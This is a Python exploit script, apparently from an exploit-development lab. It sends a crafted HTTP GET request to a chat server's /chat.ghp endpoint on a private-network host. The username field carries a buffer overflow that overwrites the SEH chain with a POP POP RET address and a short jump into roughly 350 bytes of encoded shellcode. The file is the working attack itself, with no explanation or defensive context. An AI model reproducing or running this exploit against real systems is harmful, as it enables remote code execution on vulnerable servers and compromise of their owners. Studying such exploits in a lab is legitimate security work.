import socket
from struct import pack

try:
    server = "192.168.56.108"
    port = 80

    shellcode = b"\x90" * 12  # Shellcode
    shellcode += b"\xd9\xc0\xd9\x74\x24\xf4\xba\x66\xce\x9b\x43"
    shellcode += b"\x58\x29\xc9\xb1\x52\x31\x50\x17\x83\xc0\x04"
    shellcode += b"\x03\x36\xdd\x79\xb6\x4a\x09\xff\x39\xb2\xca"
    shellcode += b"\x60\xb3\x57\xfb\xa0\xa7\x1c\xac\x10\xa3\x70"
    shellcode += b"\x41\xda\xe1\x60\xd2\xae\x2d\x87\x53\x04\x08"
    shellcode += b"\xa6\x64\x35\x68\xa9\xe6\x44\xbd\x09\xd6\x86"
    shellcode += b"\xb0\x48\x1f\xfa\x39\x18\xc8\x70\xef\x8c\x7d"
    shellcode += b"\xcc\x2c\x27\xcd\xc0\x34\xd4\x86\xe3\x15\x4b"
    shellcode += b"\x9c\xbd\xb5\x6a\x71\xb6\xff\x74\x96\xf3\xb6"
    shellcode += b"\x0f\x6c\x8f\x48\xd9\xbc\x70\xe6\x24\x71\x83"
    shellcode += b"\xf6\x61\xb6\x7c\x8d\x9b\xc4\x01\x96\x58\xb6"
    shellcode += b"\xdd\x13\x7a\x10\x95\x84\xa6\xa0\x7a\x52\x2d"
    shellcode += b"\xae\x37\x10\x69\xb3\xc6\xf5\x02\xcf\x43\xf8"
    shellcode += b"\xc4\x59\x17\xdf\xc0\x02\xc3\x7e\x51\xef\xa2"
    shellcode += b"\x7f\x81\x50\x1a\xda\xca\x7d\x4f\x57\x91\xe9"
    shellcode += b"\xbc\x5a\x29\xea\xaa\xed\x5a\xd8\x75\x46\xf4"
    shellcode += b"\x50\xfd\x40\x03\x96\xd4\x35\x9b\x69\xd7\x45"
    shellcode += b"\xb2\xad\x83\x15\xac\x04\xac\xfd\x2c\xa8\x79"
    shellcode += b"\x51\x7c\x06\xd2\x12\x2c\xe6\x82\xfa\x26\xe9"
    shellcode += b"\xfd\x1b\x49\x23\x96\xb6\xb0\xa4\x59\xee\x82"
    shellcode += b"\x35\x32\xed\xf2\x34\x79\x78\x14\x5c\x6d\x2d"
    shellcode += b"\x8f\xc9\x14\x74\x5b\x6b\xd8\xa2\x26\xab\x52"
    shellcode += b"\x41\xd7\x62\x93\x2c\xcb\x13\x53\x7b\xb1\xb2"
    shellcode += b"\x6c\x51\xdd\x59\xfe\x3e\x1d\x17\xe3\xe8\x4a"
    shellcode += b"\x70\xd5\xe0\x1e\x6c\x4c\x5b\x3c\x6d\x08\xa4"
    shellcode += b"\x84\xaa\xe9\x2b\x05\x3e\x55\x08\x15\x86\x56"
    shellcode += b"\x14\x41\x56\x01\xc2\x3f\x10\xfb\xa4\xe9\xca"
    shellcode += b"\x50\x6f\x7d\x8a\x9a\xb0\xfb\x93\xf6\x46\xe3"
    shellcode += b"\x22\xaf\x1e\x1c\x8a\x27\x97\x65\xf6\xd7\x58"
    shellcode += b"\xbc\xb2\xe8\x12\x9c\x93\x60\xfb\x75\xa6\xec"
    shellcode += b"\xfc\xa0\xe5\x08\x7f\x40\x96\xee\x9f\x21\x93"
    shellcode += b"\xab\x27\xda\xe9\xa4\xcd\xdc\x5e\xc4\xc7"

    p = b"A" * 217
    p += b"\xeb\x07\x90\x90"
    p += pack("<i", 0x10013b35)  # EIP - POP POP RET
    p += shellcode

    buf = b"GET /chat.ghp?username=" + p + b"&password=&room=1&sex= HTTP/1.1\r\n"
    buf += b"Host: 192.168.56.108\r\n"
    buf += b"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\r\n"
    buf += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
    buf += b"Referer: http://192.168.56.108/\r\n"
    buf += b"Accept-Encoding: gzip, deflate\r\n"
    buf += b"Accept-Language: en-GB,en-US;q=0.9,en;q=0.8\r\n"
    buf += b"Connection: close\r\n"
    buf += b"\r\n"

    print("\nSending payload...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buf)
    res = s.recv(1024)
    print(res)
    s.close()
    print("Done!")

except socket.error:
    print("Could not connect!")
